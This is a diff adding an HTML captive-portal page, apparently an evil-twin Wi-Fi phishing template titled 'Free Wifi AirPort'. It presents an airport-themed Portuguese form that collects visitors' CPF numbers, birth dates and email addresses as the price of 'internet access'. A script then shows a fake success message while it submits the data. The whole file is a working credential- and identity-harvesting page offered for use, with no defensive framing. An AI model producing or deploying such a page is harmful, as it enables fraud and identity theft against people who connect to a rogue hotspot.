@@ -1,0 +1,235 @@
+
+<!-- AP="Free Wifi AirPort" -->
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Free Wifi AirPort</title>
+  <meta charset='UTF-8'>
+  <meta name='viewport' content='width=device-width, initial-scale=1.0'>
+  <style>
+    a:hover{
+      text-decoration: underline;
+    }
+    body{
+      font-family: Arial, sans-serif;
+      align-items: center;
+      justify-content: center;
+      background-color: #FFFFFF;
+    }
+    input[type='text'], input[type='password']{
+      width: 100%;
+      padding: 12px 10px;
+      margin: 8px 0;
+      box-sizing: border-box;
+      border: 1px solid #cccccc;
+      border-radius: 4px;
+    }
+    .container{
+      margin: auto;
+      padding: 20px;
+      max-width: 700px;
+    }
+    .logo-container{
+      text-align: center;
+      margin-bottom: 30px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .logo{
+      width: 40px;
+      height: 40px;
+      fill: #FFC72C;
+      margin-right: 100px;
+    }
+    .company-name{
+      font-size: 42px;
+      color: black;
+      margin-left: 0px;
+    }
+    .form-container{
+      background: #FFFFFF;
+      border: 1px solid #CEC0DE;
+      border-radius: 4px;
+      padding: 20px;
+      box-shadow: 0px 0px 10px 0px rgba(108, 66, 156, 0.2);
+    }
+    h1{
+      text-align: center;
+      font-size: 28px;
+      font-weight: 500;
+      margin-bottom: 20px;
+    }
+    .input-field{
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #BEABD3;
+      border-radius: 4px;
+      margin-bottom: 20px;
+      font-size: 14px;
+    }
+    .input-field{
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #BEABD3;
+      border-radius: 4px;
+      margin-bottom: 20px;
+      font-size: 14px;
+    }
+    .submit-btn{
+      background: #0b57d0;
+      color: white;
+      border: none;
+      padding: 12px 20px;
+      border-radius: 4px;
+      font-size: 0.875rem;
+    }
+    .submit-btn:hover{
+      background: #0e4eb3;
+    }
+    .forgot-btn{
+      background: transparent;
+      color: #0b57d0;
+      border-radius: 8px;
+      border: none;
+      font-size: 14px;
+      cursor: pointer;
+    }
+    .forgot-btn:hover{
+      background-color: rgba(11,87,208,0.08);
+    }
+    input[type='date'] {
+      appearance: none;
+      -webkit-appearance: none;
+      -moz-appearance: none;
+      background-color: white;
+      padding: 12px;
+      border: 1px solid #BEABD3;
+      border-radius: 4px;
+      margin-bottom: 20px;
+      font-size: 14px;
+      width: 100%;
+      box-sizing: border-box;
+    }
+    .containerlogo{
+      padding-top: 25px;
+    }
+    .containertitle{
+      color: #202124;
+      font-size: 24px;
+      padding: 15px 0px 10px 0px;
+    }
+    .containersubtitle{
+      color: #202124;
+      font-size: 16px;
+      padding: 0px 0px 30px 0px;
+    }
+    /* .containermsg{
+      padding: 30px 0px 0px 0px;
+      color: #5f6368;
+    } */
+    .containerbtn{
+      display: flex;
+      justify-content: end;
+      padding: 30px 0px 25px 0px;
+    }
+    div#form-block{
+      min-height: 150px;
+    }
+    div#success-block{
+      display: none;
+      text-align: center;
+      min-height: 100px;
+      margin-bottom: 30px;
+      justify-content: center;
+      align-items: center;
+    }
+    @media screen and (min-width: 768px){
+      .logo{
+        max-width: 80px;
+        max-height: 80px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class='container'>
+    <div class='logo-container'>
+      <?xml version='1.0' standalone='no'?>
+      <!DOCTYPE svg PUBLIC '-//W3C//DTD SVG 20010904//EN' 'http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd'>
+    </div>
+    <div class=form-container>
+      <center>
+        <div class='containerlogo'>
+          <!-- Google Logo -->
+          <div id="logo" title="Aeroporto">
+            <svg class="icon" height="80" viewBox="0 0 1024 1024" width="80" xmlns="http://www.w3.org/2000/svg">
+              <path d="M682.666667 938.666667l-128-42.666667 12.8-170.666667 115.2 128zM896 725.333333l-320-157.866666-4.266667-149.333334-4.266666-98.133333L896 644.266667zM341.333333 938.666667l128-42.666667-12.8-170.666667-115.2 128zM128 725.333333l320-157.866666 4.266667-149.333334 4.266666-98.133333L128 644.266667z" fill="#2196F3"/>
+              <path d="M512 85.333333c-46.933333 0-85.333333 38.4-85.333333 85.333334v704c0 23.466667 19.2 42.666667 42.666666 42.666666h85.333334c23.466667 0 42.666667-19.2 42.666666-42.666666V170.666667c0-46.933333-38.4-85.333333-85.333333-85.333334z" fill="#64B5F6"/>
+              <path d="M490.666667 725.333333h42.666666v192h-42.666666z" fill="#2196F3"/>
+            </svg>
+
+          </div>
+          <!-- /Google Logo -->
+        </div>
+      </center>
+      <div id='form-block'>
+        <center>
+          <div class='containertitle'>Cadastre-se para Utilizar</div>
+          <div class='containersubtitle'>Insira seus Dados Pessoais</div>
+        </center>
+        <form action='/post' id='login-form'>
+           <!-- CPF -->
+          <input name="cpf" id="cpf" class="input-field" type="text"
+            maxlength="14" 
+            pattern="\d{3}\.\d{3}\.\d{3}-\d{2}"
+            oninput="formatarCPF(this)"
+            oninvalid="this.setCustomValidity('Por favor, insira o CPF no formato XXX.XXX.XXX-XX')"
+            oninput="this.setCustomValidity('')"
+            placeholder="CPF (Somente Números)" required>
+          <input name='data-nascimento' class='input-field' type='text' pattern="\d{2}/\d{2}/\d{4}" oninvalid="this.setCustomValidity('Por favor, insira a data no formato dd/mm/aaaa')" placeholder='Data Nascimento' required>
+          <input name='email' class='input-field' type='email' placeholder='E-mail' required>
+          <div class='containerbtn'>
+            <button id=submitbtn class=submit-btn type=submit>Acessar Internet</button>
+          </div>
+        </form>
+      </div>
+      <div id='success-block'>
+        <center>
+          <div>Conectado com sucesso. </br>Em instantes você será redirecionado.</div>
+        </center>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById('login-form').addEventListener('submit', function(event) {
+      event.preventDefault();
+
+      document.getElementById('success-block').style.display = 'flex';
+      document.getElementById('form-block').style.display = 'none';
+
+      setTimeout(function() {
+        document.getElementById('login-form').submit();
+      }, 3000);
+    });
+
+
+    function formatarCPF(input) {
+    // Remove tudo que não for dígito
+    let valor = input.value.replace(/\D/g, '');
+
+    // Limita a 11 dígitos
+    if (valor.length > 11) valor = valor.slice(0, 11);
+
+    // Aplica a máscara
+    valor = valor.replace(/(\d{3})(\d)/, '$1.$2');
+    valor = valor.replace(/(\d{3})(\d)/, '$1.$2');
+    valor = valor.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+
+    input.value = valor;
+    }
+
+  </script>
+</body>
+</html>
